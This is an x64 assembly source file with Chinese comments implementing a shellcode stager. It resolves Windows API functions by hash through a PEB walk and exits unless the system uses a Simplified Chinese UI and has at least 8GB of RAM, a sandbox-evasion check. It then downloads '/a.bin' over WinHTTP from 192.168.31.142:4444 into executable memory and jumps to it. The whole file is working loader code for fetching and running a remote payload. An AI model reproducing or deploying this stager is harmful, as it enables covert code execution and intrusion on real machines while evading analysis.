.code

main proc

	; 清除方向标志并对齐栈指针，确保符合Windows x64调用约定
	cld														; 清除方向标志（DF=0），字符串操作向高地址进行
	and rsp, 0FFFFFFFFFFFFFFF0h								; 将RSP对齐到16字节边界，避免栈未对齐导致的异常

	; 2. 加载wininet.dll库
	push 0													; 为了对齐
	mov r14, 'ptthniw'										; 构造字符串'winhttp\0'
	push r14												; 将字符串压栈，此时RSP指向"winhttp\0"的地址
	mov rcx, rsp											; RCX = 字符串地址，作为LoadLibraryA的参数
	mov r10, 0DEC21CCDh										; kernel32.dll+LoadLibraryA的哈希值
	call GetProcAddressByHash

	;GetUserDefaultUILanguage是返回当前用户的用户UI语言的语言标识符
	xor rcx, rcx											;没参数，全部置0
	xor rdx, rdx
	xor r8, r8
	xor r9, r9
	mov r10, 0924E9A49h									
	call GetProcAddressByHash								;调用API之后中文简体返回的值为0x804，许多沙箱都是默认配置搭建起来的，所以使用英文系统。
	cmp eax, 0804h											;判断返回值是否等于0x804。等于0x804代码进行内存大小判断操作，反之代码跳到failure结束运行。
	jnz failure

	;GlobalMemoryStatusEx检索有关系统当前物理内存和虚拟内存使用情况的信息。
    sub rsp, 40h											;分配栈空间
    mov dword ptr [rsp], 40h								;dwLength = sizeof(MEMORYSTATUSEX)
    lea rcx, [rsp]											;RCX = &memoryStatus
	xor rdx, rdx
	xor r8, r8
	xor r9, r9
	mov r10, 0681B0A64h										;GlobalMemoryStatusEx
    call GetProcAddressByHash
	test rax, rax											;检查返回值
    jz  failure												;调用失败，返回 0

    mov rax, [rsp+28h]										;RAX = memoryStatus.ullTotalPhys (总物理内存字节数)
    mov rbx, 32												;内存大小给到RBX，8GB
    shl rbx, 30												;使用逻辑运算，左移一位。这儿算是一个小tips，避免了算数换算，减小了一些字节。
    cmp rax, rbx											;比较总物理内存是否 >= 8GB，比较完成之后标志位会被设置
    setge al												;根据标志位进行判断，如果 >= 8GB，AL = 1 , 否则 AL = 0
    movzx rax, al											;RAX = 0 或 1 (返回值)
    add rsp, 40h											;释放栈
	test eax,eax											;rax当中的值为1那么内存大于8GB继续执行，进行shellcode下载执行操作；反子执行下一行代码跳入failure结束运行。
	jz failure

	; 3.WinHttpOpen
	xor rcx,rcx												; pszAgentW
	xor rdx,rdx												; dwAccessType
	xor r8,r8												; pszProxyW
	xor r9,r9												; pszProxyBypassW
	push 1													; dwFlags
	push r9													; 对齐
	mov r10,332D226Eh										; winhttp.dll+WinHttpOpen hash
	call GetProcAddressByHash

	jmp get_server_host
	; 4.调用WinHttpConnect连接到服务器
winHttpConnect:
	mov rcx,rax												; hSession
	pop rdx													; pswzServerName
	mov r8,4444												; nServerPort
	xor r9,r9												; dwReserved
	mov r10,39AE9EB0h										; winhttp.dll+WinHttpConnect hash
	call GetProcAddressByHash

	; 5.调用WinHttpOpenRequest创建HTTP请求句柄
	call winHttpOpenRequest
server_uri:
	dw '/','a','.','b','i','n',0
winHttpOpenRequest:
	mov rcx,rax												; hConnect
	xor rdx,rdx												; pwszVerb
	pop r8													; pwszObjectName
	xor r9,r9												; pwszVersion
	push r9													; dwFlags
	push r9													; *ppwszAcceptTypes
	push r9													; pwszReferrer
	push r9													; 对齐
	mov r10,0D3431402h										; winhttp.dll+WinHttpOpenRequest hash
	call GetProcAddressByHash	
	xchg rsi, rax											; 保存请求句柄到RSI备用

	; 6.调用WinHttpSendRequest发送HTTP请求
	mov rcx,rsi												; hRequest
	xor rdx,rdx												; lpszHeaders
	xor r8,r8												; dwHeadersLength
	xor r9,r9												; lpOptional
	push r9													; dwContext
	push r9													; dwTotalLength
	push r9													; dwOptionalLength
	push r9													; 对齐
	mov r10,094B5BFFh										; winhttp.dll+WinHttpSendRequest hash
	call GetProcAddressByHash

	; 7.调用WinHttpReceiveResponse等待服务器响应
	mov rcx,rsi												; hRequest
	xor rdx,rdx												; lpReserved
	mov r10,0E82D8B6Fh										; winhttp.dll+WinHttpReceiveResponse hash
	call GetProcAddressByHash
	test eax,eax
	jz failure

	; 8.调用VirtualAlloc分配内存空间用于存储Shellcode
	xor rcx, rcx                    						; lpAddress = NULL（由系统选择地址）
	mov rdx, 00400000h              						; dwSize = 4MB（分配内存大小）
	mov r8, 1000h                   						; flAllocationType = MEM_COMMIT（提交物理内存）
	mov r9, 40h                     						; flProtect = PAGE_EXECUTE_READWRITE（可读可写可执行）
	mov r10, 0BCEF49D9h             						; kernel32.dll+VirtualAlloc 的哈希值
	call GetProcAddressByHash

download_prep:
	xchg rax, rbx                   						; 将基地址存入RBX
	push rbx                        						; 对齐
	push rbx                        						; 占位符（用于存储WinHttpReadData返回的已读字节数）
	mov rdi, rsp                    						; RDI指向已读字节数变量（栈地址）	
download_more:
	mov rcx,rsi												; hRequest
	mov rdx,rbx												; lpBuffer
	mov r8, 8192											; dwNumberOfBytesToRead
	mov r9,rdi												; lpdwNumberOfBytesRead
	mov r10,0F5B42CD6h										; winhttp.dll+WinHttpReadData hash
	call GetProcAddressByHash
	add rsp, 32												; 清理影子空间

	test eax,eax
	jz failure

	mov ax, word ptr [rdi]									; 读取已读字节数
	add rbx,rax												; 移动缓冲区指针到下一个写入位置
	test eax,eax											;  检查是否已读取完毕（字节数为0）
	jnz download_more

	pop rax													; clear the temporary storage
	pop rax													; fucking 对齐

execute_stage:
	ret                             						; 跳转到下载的Shellcode执行

    ; 结束
failure:
    mov r10,2E3E5B71h              							; kernel32.dll+ExitProcess 哈希值
    call GetProcAddressByHash 

GetProcAddressByHash:
	
	; 1. 保存前4个参数到栈上，并保存rsi的值
	push r9
	push r8
	push rdx
	push rcx
	push rsi

	; 2. 获取 InMemoryOrderModuleList 模块链表的第一个模块结点
	xor rdx,rdx												; 清零
	mov rdx,gs:[rdx+60h]									; 通过GS段寄存器获取PEB地址（TEB偏移0x60处）
	mov rdx,[rdx+18h]										; PEB->Ldr
	mov rdx,[rdx+20h]										; 第一个模块节点，也是链表InMemoryOrderModuleList的首地址

	;3.模块遍历
next_mod:
	mov rsi,[rdx+50h]                 						; 模块名称
	movzx rcx,word ptr [rdx+48h]	 						; 模块名称长度
	xor r8,r8                         						; 存储接下来要计算的hash

	; 4.计算模块hash
loop_modname:
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rSI加载一个字节到AL（自动递增rSI）
	cmp al,'a'												; 比较当前字符的ASCII值是否小于小写字母'a'(0x61)
	jl not_lowercase										; 如果字符 < 'a'，说明不是小写字母，跳转不处理
	sub al, 20h												; 若字符在'a'-'z'范围内，通过减0x20转换为大写字母（'A'-'Z'）
not_lowercase:
	ror r8d,0dh												; 对R8的低32位进行循环右移13位，不影响高32位
	add r8d,eax												; 将当前字符的ASCII值（已大写化）累加到哈希值
	dec ecx													; 字符计数器ECX减1
	jnz loop_modname										; 继续循环处理下一个字符，直到ECX减至0
	push rdx												; 将当前模块链表节点地址压栈    
	push r8													; 将计算完成的哈希值压栈存储hash值

	; 5.获取导出表
	mov rdx, [rdx+20h]										; 获取模块基址
	mov eax, dword ptr [rdx+3ch]							; 读取PE头的RVA
	add rax, rdx											; PE头VA
	cmp word ptr [rax+18h],20Bh								; 检查是否为PE64文件
	jne get_next_mod1										; 不是就下一个模块
	mov eax, dword ptr [rax+88h]							; 获取导出表的RVA
	test rax, rax											; 检查该模块是否有导出函数
	jz get_next_mod1										; 没有就下一个模块
	add rax, rdx											; 获取导出表的VA
	push rax												; 存储导出表的地址
	mov ecx, dword ptr [rax+18h]							; 按名称导出的函数数量
	mov r9d, dword ptr [rax+20h]							; 函数名称字符串地址数组的RVA
	add r9, rdx												; 函数名称字符串地址数组的VA

	; 6.获取函数名	
get_next_func:	
	test rcx, rcx											; 检查按名称导出的函数数量是否为0
	jz get_next_mod											; 若所有函数已处理完，跳转至下一个模块遍历
	dec rcx													; 函数计数器递减（从后向前遍历函数名数组）
	mov esi, dword ptr [r9+rcx*4]							; 从末尾往前遍历，一个函数名RVA占4字节
	add rsi, rdx											; 函数名RVA
	xor r8, r8												; 存储接下来的函数名哈希

	; 7.计算模块 hash + 函数 hash之和
loop_funcname: 
	xor rax, rax											; 清零EAX，准备处理字符
	lodsb													; 从rsi加载一个字节到al，rsi自增1
	ror r8d,0dh												; 对当前哈希值（r8d）循环右移13位
	add r8d,eax												; 将当前字符的ASCII值（al）累加到哈希值（r8d）
	cmp al, ah												; 检查当前字符是否为0（字符串结束符）
	jne loop_funcname										; 若字符非0，继续循环处理下一个字符
	add r8,[rsp+8]											; 将之前压栈的模块哈希值（位于栈顶+8）加到当前函数哈希
	cmp r8d,r10d											; r10存储目标hash
	jnz get_next_func

	; 8.获取目标函数指针
	pop rax													; 获取之前存放的当前模块的导出表地址
	mov r9d, dword ptr [rax+24h]							; 获取序号表（AddressOfNameOrdinals）的 RVA
	add r9, rdx												; 序号表起始地址
	mov cx, [r9+2*rcx]										; 从序号表中获取目标函数的导出索引
	mov r9d, dword ptr [rax+1ch]							; 获取函数地址表（AddressOfFunctions）的 RVA
	add r9, rdx												; AddressOfFunctions数组的首地址
	mov eax, dword ptr [r9+4*rcx]							; 获取目标函数指针的RVA
	add rax, rdx											; 获取目标函数指针的地址

finish:
	pop r8													; 清除当前模块hash
	pop r8													; 清除当前链表的位置
	pop rsi													; 恢复RSI
	pop rcx													; 恢复第一个参数
	pop rdx													; 恢复第二个参数
	pop r8													; 恢复第三个参数
	pop r9													; 恢复第四个参数
	pop r10													; 将返回地址地址存储到r10中
	sub rsp, 20h											; 给前4个参数预留 4*8=32（20h）的影子空间
	push r10												; 返回地址
	jmp rax													; 调用目标函数

get_next_mod:                 
	pop rax                         						; 弹出栈中保存的导出表地址
get_next_mod1:
	pop r8                         							; 弹出之前压栈的计算出来的模块哈希值
	pop rdx                         						; 弹出之前存储在当前模块在链表中的位置
	mov rdx, [rdx]                  						; 获取链表的下一个模块节点（FLINK）
	jmp next_mod                    						; 跳转回模块遍历循环

get_server_host:
call winHttpConnect

server_host:	
	dw '1','9','2','.','1','6','8','.','3','1','.','1','4','2',0 
main endp
end